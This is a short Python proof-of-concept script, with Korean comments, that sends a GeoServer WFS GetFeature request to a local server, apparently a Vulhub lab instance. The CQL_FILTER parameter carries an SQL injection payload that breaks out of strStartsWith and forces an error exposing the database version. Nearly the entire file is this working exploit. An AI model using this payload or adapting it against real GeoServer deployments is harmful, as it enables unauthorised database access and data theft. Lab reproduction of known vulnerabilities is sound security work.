import requests

# 대상 URL
url = "http://localhost:8080/geoserver/ows"

# CQL_FILTER에 들어갈 원본 인젝션 문자열 (URL 디코딩된 상태)
cql_filter = "strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer)) -- ') = true"

# 파라미터 설정
params = {
    "service": "wfs",
    "version": "1.0.0",
    "request": "GetFeature",
    "typeName": "vulhub:example",
    "CQL_FILTER": cql_filter
}

# 요청 보내기
try:
    response = requests.get(url, params=params)
    print("[+] 요청 성공!")
    print("[+] 상태 코드:", response.status_code)
    print("[+] 응답 내용:\n")
    print(response.text)

except requests.exceptions.RequestException as e:
    print("[-] 요청 실패:", e)
